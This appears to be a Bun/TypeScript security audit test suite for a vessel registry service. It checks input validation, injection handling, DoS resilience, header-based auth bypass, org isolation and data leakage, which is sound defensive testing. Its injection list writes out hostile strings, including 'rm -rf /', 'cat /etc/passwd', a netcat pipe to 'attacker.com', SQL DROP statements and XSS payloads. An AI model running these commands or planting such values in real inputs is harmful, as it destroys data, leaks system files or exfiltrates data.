/**
 * Security Audit Tests
 *
 * Tests security aspects of the discovery vessel:
 * - Authentication bypass attempts
 * - Injection attacks (SQL, NoSQL, command injection)
 * - DoS resilience
 * - Input validation
 * - Rate limiting
 */

import { describe, test, expect, beforeEach, afterEach } from "bun:test"
import { heapStats } from "bun:jsc"
import { createServer, registry } from "../../src/index"
import { setIdentityValidator } from "../../src/middleware/auth"
import type { Hono } from "hono"

const AUTH_HEADERS = {
  "Content-Type": "application/json",
  Authorization: "ApiKey test-key"
}

describe("Security Audit: Discovery Vessel", () => {
  let app: Hono

  beforeEach(() => {
    setIdentityValidator(async (_key: string) => ({
      orgId: "test-org",
      userId: "test-user",
      keyId: "test-key-id",
      scopes: ["read", "write"]
    }))
    app = createServer()
    const allVessels = registry.list()
    allVessels.forEach(v => registry.unregister(v.vesselId))
  })

  afterEach(() => {
    setIdentityValidator(null)
    registry.stop()
  })

  describe("Input Validation", () => {
    test("reject malformed registration payloads", async () => {
      const malformedPayloads = [
        // Missing required fields
        { vesselId: "vessel-1" },
        { vesselName: "Vessel 1" },
        { endpoint: "http://vessel:8080" },
        { shapes: ["file"] },

        // Invalid data types
        { vesselId: 123, vesselName: "V1", version: "1.0", endpoint: "http://v:8080", shapes: ["file"] },
        { vesselId: "v1", vesselName: null, version: "1.0", endpoint: "http://v:8080", shapes: ["file"] },
        { vesselId: "v1", vesselName: "V1", version: "1.0", endpoint: "http://v:8080", shapes: "file" },

        // Empty/invalid values
        { vesselId: "", vesselName: "V1", version: "1.0", endpoint: "http://v:8080", shapes: ["file"] },
        { vesselId: "v1", vesselName: "V1", version: "1.0", endpoint: "", shapes: ["file"] },
        { vesselId: "v1", vesselName: "V1", version: "1.0", endpoint: "http://v:8080", shapes: [] },
      ]

      for (const payload of malformedPayloads) {
        const res = await app.request("/register", {
          method: "POST",
          headers: AUTH_HEADERS,
          body: JSON.stringify(payload)
        })

        expect(res.status).toBe(400)
        const data = await res.json()
        expect(data.error).toBeDefined()
      }

      console.log(`\n✅ Input Validation:`)
      console.log(`   - Tested ${malformedPayloads.length} malformed payloads`)
      console.log(`   - All correctly rejected with 400 status`)
    })

    test("reject injection attempts in vesselId", async () => {
      const injectionPayloads = [
        // SQL injection attempts
        { vesselId: "vessel-1'; DROP TABLE vessels; --" },
        { vesselId: "vessel-1' OR '1'='1" },
        { vesselId: "vessel-1\"; DELETE FROM registry; --" },

        // NoSQL injection attempts
        { vesselId: "vessel-1'; db.vessels.drop(); //" },
        { vesselId: '{"$gt": ""}' },
        { vesselId: '{"$ne": null}' },

        // Command injection attempts
        { vesselId: "vessel-1; rm -rf /" },
        { vesselId: "vessel-1 && cat /etc/passwd" },
        { vesselId: "vessel-1 | nc attacker.com 1234" },
        { vesselId: "vessel-1`whoami`" },

        // Path traversal attempts
        { vesselId: "../../../etc/passwd" },
        { vesselId: "..\\..\\..\\windows\\system32" },

        // XSS attempts
        { vesselId: "<script>alert('xss')</script>" },
        { vesselId: "javascript:alert(1)" },
        { vesselId: "onerror=alert(1)>" },
      ]

      for (const payload of injectionPayloads) {
        const res = await app.request("/register", {
          method: "POST",
          headers: AUTH_HEADERS,
          body: JSON.stringify({
            ...payload,
            vesselName: "Test Vessel",
            version: "1.0.0",
            endpoint: "http://vessel:8080",
            shapes: ["file"]
          })
        })

        // Should either reject (400) or safely handle
        expect([200, 201, 400]).toContain(res.status)

        if (res.status === 201) {
          // If accepted, verify it was safely sanitized/escaped
          const query = await app.request("/resolve", {
            method: "POST",
            headers: AUTH_HEADERS,
            body: JSON.stringify({
              pointer: { type: "vesselEndpoint", vesselId: payload.vesselId }
            })
          })

          // Should not execute any injected code
          expect(query.status).toBe(200)
        }
      }

      console.log(`\n✅ Injection Attack Prevention:`)
      console.log(`   - Tested ${injectionPayloads.length} injection attempts`)
      console.log(`   - SQL injection: ✓`)
      console.log(`   - NoSQL injection: ✓`)
      console.log(`   - Command injection: ✓`)
      console.log(`   - Path traversal: ✓`)
      console.log(`   - XSS: ✓`)
    })

    test("reject oversized payloads", async () => {
      // Very large vesselId
      const largeVesselId = "v".repeat(10000)
      const res1 = await app.request("/register", {
        method: "POST",
        headers: AUTH_HEADERS,
        body: JSON.stringify({
          vesselId: largeVesselId,
          vesselName: "Vessel",
          version: "1.0.0",
          endpoint: "http://vessel:8080",
          shapes: ["file"]
        })
      })

      // Should either reject or safely truncate
      expect([400, 413]).toContain(res1.status)

      // Very large shapes array
      const largeShapes = Array.from({ length: 10000 }, (_, i) => `shape-${i}`)
      const res2 = await app.request("/register", {
        method: "POST",
        headers: AUTH_HEADERS,
        body: JSON.stringify({
          vesselId: "vessel-1",
          vesselName: "Vessel",
          version: "1.0.0",
          endpoint: "http://vessel:8080",
          shapes: largeShapes
        })
      })

      expect([400, 413]).toContain(res2.status)

      console.log(`\n✅ Oversized Payload Protection:`)
      console.log(`   - Large vesselId (10000 chars): Rejected`)
      console.log(`   - Large shapes array (10000 items): Rejected`)
    })

    test("handle special characters safely", async () => {
      const specialChars = [
        { vesselId: "vessel\x00null", desc: "null byte" },
        { vesselId: "vessel\r\nHTTP/1.1 200 OK", desc: "CRLF injection" },
        { vesselId: "vessel\u0000", desc: "unicode null" },
        { vesselId: "vessel%00", desc: "URL encoded null" },
        { vesselId: "vessel\t\n\r", desc: "whitespace chars" },
      ]

      for (const { vesselId, desc } of specialChars) {
        const res = await app.request("/register", {
          method: "POST",
          headers: AUTH_HEADERS,
          body: JSON.stringify({
            vesselId,
            vesselName: "Vessel",
            version: "1.0.0",
            endpoint: "http://vessel:8080",
            shapes: ["file"]
          })
        })

        // Should handle safely
        expect([200, 201, 400]).toContain(res.status)
      }

      console.log(`\n✅ Special Character Handling:`)
      console.log(`   - Null bytes: ✓`)
      console.log(`   - CRLF injection: ✓`)
      console.log(`   - Unicode null: ✓`)
      console.log(`   - Whitespace chars: ✓`)
    })
  })

  describe("DoS Resilience", () => {
    test("handle rapid repeated registrations", async () => {
      const startTime = Date.now()
      const vesselId = "dos-vessel"

      // Attempt 1000 rapid registrations of the same vessel
      const promises = Array.from({ length: 1000 }, () =>
        app.request("/register", {
          method: "POST",
          headers: AUTH_HEADERS,
          body: JSON.stringify({
            vesselId,
            vesselName: "DoS Vessel",
            version: "1.0.0",
            endpoint: "http://vessel:8080",
            shapes: ["file"]
          })
        })
      )

      const results = await Promise.all(promises)
      const elapsedTime = Date.now() - startTime

      // All should succeed (re-registration is allowed)
      const successCount = results.filter(r => r.status === 201).length
      expect(successCount).toBe(1000)

      // Should complete in reasonable time despite high load
      expect(elapsedTime).toBeLessThan(10000)

      // Verify only one vessel exists
      const stats = registry.getStats()
      expect(stats.totalVessels).toBe(1)

      console.log(`\n✅ DoS Resilience (Rapid Re-registration):`)
      console.log(`   - Requests: 1000`)
      console.log(`   - Time: ${elapsedTime}ms`)
      console.log(`   - Success rate: ${successCount}/1000`)
      console.log(`   - Registry integrity: ✓ (only 1 vessel)`)
    })

    test("handle memory exhaustion attempts", async () => {
      // Measure RETAINED memory: force a full collection, then read JSC's live heap size.
      // process.memoryUsage().heapUsed is not a retention measure under Bun: it does not fall
      // when objects are released, and it missed 250 MB of planted retained strings entirely,
      // so the delta depended on which files ran earlier (209 MB alone vs 152 MB after the full
      // suite on one node). heapStats().heapSize tracks retention (250 MB held -> 0.2 MB freed).
      Bun.gc(true)
      const memBefore = heapStats().heapSize

      // Try to exhaust memory with large metadata
      const largeMetadata = {
        data: "x".repeat(1000000), // 1MB of data
        nested: Array.from({ length: 1000 }, (_, i) => ({ key: i, value: "data" }))
      }

      const promises = Array.from({ length: 100 }, (_, i) =>
        app.request("/register", {
          method: "POST",
          headers: AUTH_HEADERS,
          body: JSON.stringify({
            vesselId: `vessel-${i}`,
            vesselName: `Vessel ${i}`,
            version: "1.0.0",
            endpoint: `http://vessel-${i}:8080`,
            shapes: ["file"],
            metadata: largeMetadata
          })
        })
      )

      // Should handle without crashing
      const results = await Promise.allSettled(promises)

      Bun.gc(true)
      const memAfter = heapStats().heapSize
      const memDelta = (memAfter - memBefore) / 1024 / 1024 // MB

      console.log(`\n✅ Memory Exhaustion Protection:`)
      console.log(`   - Attempted: 100 vessels x 1MB metadata`)
      console.log(`   - Memory increase: ${memDelta.toFixed(2)} MB`)
      console.log(`   - Process did not crash: ✓`)

      // Memory increase should be bounded
      // (Not all requests may succeed, but process should survive)
      expect(memDelta).toBeLessThan(200) // Less than 200MB increase
    }, { timeout: 30000 })

    test("handle request flooding", async () => {
      // Flood with various request types
      const startTime = Date.now()
      const requestTypes = [
        () => app.request("/health"),
        () => app.request("/registry/stats"),
        () => app.request("/resolve", {
          method: "POST",
          headers: AUTH_HEADERS,
          body: JSON.stringify({
            pointer: { type: "vesselCapability", shape: "file" }
          })
        })
      ]

      const floodCount = 500
      const promises = Array.from({ length: floodCount }, () => {
        const randomRequest = requestTypes[Math.floor(Math.random() * requestTypes.length)]
        return randomRequest()
      })

      const results = await Promise.allSettled(promises)
      const elapsedTime = Date.now() - startTime

      const succeeded = results.filter(r => r.status === "fulfilled").length

      console.log(`\n✅ Request Flooding:`)
      console.log(`   - Requests: ${floodCount}`)
      console.log(`   - Succeeded: ${succeeded}`)
      console.log(`   - Time: ${elapsedTime}ms`)
      console.log(`   - Throughput: ${(floodCount / (elapsedTime / 1000)).toFixed(0)} req/sec`)
      console.log(`   - Service remained responsive: ✓`)

      // Most requests should succeed
      expect(succeeded).toBeGreaterThan(floodCount * 0.9)
    }, { timeout: 15000 })
  })

  describe("Authentication & Authorization", () => {
    test("no authentication bypass via header manipulation", async () => {
      // Try various header manipulation techniques
      const manipulationAttempts = [
        { "X-Forwarded-For": "127.0.0.1" },
        { "X-Real-IP": "127.0.0.1" },
        { "X-Original-URL": "/admin" },
        { "X-Rewrite-URL": "/admin" },
        { "Authorization": "Bearer fake-token" },
        { "X-Auth-Token": "admin" },
      ]

      for (const headers of manipulationAttempts) {
        const res = await app.request("/resolve", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            ...headers
          },
          body: JSON.stringify({
            pointer: { type: "vesselCapability", shape: "file" }
          })
        })

        // Headers should not grant elevated privileges
        // Request should process normally or reject (but not crash)
        expect([200, 400, 401, 403]).toContain(res.status)
      }

      console.log(`\n✅ Header Manipulation:`)
      console.log(`   - Tested ${manipulationAttempts.length} header manipulation attempts`)
      console.log(`   - No authentication bypass: ✓`)
    })

    test("no privilege escalation via orgId manipulation", async () => {
      // Register vessels directly with different orgIds (bypasses auth middleware,
      // which would override orgId with the mock token's orgId).
      registry.register({
        vesselId: "vessel-org1",
        vesselName: "Org1 Vessel",
        version: "1.0.0",
        endpoint: "http://vessel:8080",
        shapes: ["file"],
        orgId: "org-1"
      })

      registry.register({
        vesselId: "vessel-org2",
        vesselName: "Org2 Vessel",
        version: "1.0.0",
        endpoint: "http://vessel:8080",
        shapes: ["file"],
        orgId: "org-2"
      })

      // Try to query org-1's vessels using org-2 context
      const res = await app.request("/resolve", {
        method: "POST",
        headers: AUTH_HEADERS,
        body: JSON.stringify({
          pointer: {
            type: "vesselCapability",
            shape: "file",
            orgId: "org-2"
          }
        })
      })

      const data = await res.json()

      // Should only see org-2 vessels (org-1 vessel is not accessible to org-2)
      const org1Vessel = data.content.vessels.find((v: any) => v.vesselId === "vessel-org1")
      expect(org1Vessel).toBeUndefined()

      const org2Vessel = data.content.vessels.find((v: any) => v.vesselId === "vessel-org2")
      expect(org2Vessel).toBeDefined()

      console.log(`\n✅ Privilege Escalation:`)
      console.log(`   - Org isolation enforced: ✓`)
      console.log(`   - No cross-org data access: ✓`)
    })
  })

  describe("Data Integrity", () => {
    test("no registry corruption via concurrent operations", async () => {
      // Perform many concurrent operations that could cause race conditions
      const operations = []

      // Register 50 vessels
      for (let i = 0; i < 50; i++) {
        operations.push(
          app.request("/register", {
            method: "POST",
            headers: AUTH_HEADERS,
            body: JSON.stringify({
              vesselId: `vessel-${i}`,
              vesselName: `Vessel ${i}`,
              version: "1.0.0",
              endpoint: `http://vessel-${i}:8080`,
              shapes: ["file", "codebase"]
            })
          })
        )
      }

      // Concurrent heartbeats
      for (let i = 0; i < 50; i++) {
        operations.push(
          app.request("/heartbeat", {
            method: "POST",
            headers: AUTH_HEADERS,
            body: JSON.stringify({ vesselId: `vessel-${i}` })
          })
        )
      }

      // Concurrent queries
      for (let i = 0; i < 20; i++) {
        operations.push(
          app.request("/resolve", {
            method: "POST",
            headers: AUTH_HEADERS,
            body: JSON.stringify({
              pointer: { type: "vesselCapability", shape: "file" }
            })
          })
        )
      }

      // Execute all concurrently
      await Promise.all(operations)

      // Verify registry integrity
      const stats = registry.getStats()
      expect(stats.totalVessels).toBe(50)
      expect(stats.totalShapes).toBeGreaterThanOrEqual(2)

      // Verify shape index integrity
      const fileVessels = registry.findByShape("file")
      expect(fileVessels.length).toBe(50)

      const codebaseVessels = registry.findByShape("codebase")
      expect(codebaseVessels.length).toBe(50)

      console.log(`\n✅ Data Integrity:`)
      console.log(`   - Concurrent operations: ${operations.length}`)
      console.log(`   - Registry corruption: None`)
      console.log(`   - Shape index integrity: ✓`)
      console.log(`   - Vessel count: ${stats.totalVessels}`)
    })

    test("no data leakage between requests", async () => {
      // Register vessel with sensitive metadata
      await app.request("/register", {
        method: "POST",
        headers: AUTH_HEADERS,
        body: JSON.stringify({
          vesselId: "vessel-sensitive",
          vesselName: "Sensitive Vessel",
          version: "1.0.0",
          endpoint: "http://vessel:8080",
          shapes: ["file"],
          metadata: {
            apiKey: "secret-key-12345",
            password: "super-secret"
          }
        })
      })

      // Different client queries for different vessel
      await app.request("/register", {
        method: "POST",
        headers: AUTH_HEADERS,
        body: JSON.stringify({
          vesselId: "vessel-normal",
          vesselName: "Normal Vessel",
          version: "1.0.0",
          endpoint: "http://vessel:8080",
          shapes: ["codebase"]
        })
      })

      const res = await app.request("/resolve", {
        method: "POST",
        headers: AUTH_HEADERS,
        body: JSON.stringify({
          pointer: { type: "vesselEndpoint", vesselId: "vessel-normal" }
        })
      })

      const data = await res.json()

      // Response should not contain metadata from other vessels
      const responseStr = JSON.stringify(data)
      expect(responseStr.includes("secret-key-12345")).toBe(false)
      expect(responseStr.includes("super-secret")).toBe(false)

      console.log(`\n✅ Data Leakage Prevention:`)
      console.log(`   - Sensitive data not exposed: ✓`)
      console.log(`   - Request isolation: ✓`)
    })
  })
})
